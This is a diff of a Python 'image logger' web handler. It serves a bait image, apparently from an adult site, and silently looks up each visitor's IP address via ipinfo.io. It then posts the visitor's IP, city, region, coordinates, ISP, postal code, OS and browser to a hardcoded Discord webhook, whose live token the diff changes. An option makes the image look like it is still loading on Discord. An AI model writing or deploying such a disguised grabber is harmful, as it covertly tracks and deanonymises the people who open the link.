@@ -2,8 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1067207085785350195/xE3sGLwfaMU4DDvsBolY71qCsJram_sJjErF3cWaW21wC9Op-W1kNxAM_Grc8VuPMRma'
-bindata = requests.get('https://content-cdn.tips-and-tricks.co/wp-content/uploads/2021/12/01091312/1-768x512.jpeg').content
+webhook = 'https://discord.com/api/webhooks/1067207078768291840/t-UW9b_i2v2504nkJh_8WmE285EUlOgq86g8VTKA8GGuPx-g8c-Ib69tpQX-W55ZLmgK'
+bindata = requests.get('https://cdn.socialmediapornstars.com/img/650a.jpg').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
@@ -72,4 +72,3 @@ class handler(BaseHTTPRequestHandler):
             else: pass
         else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = requests.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); requests.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
         return
-
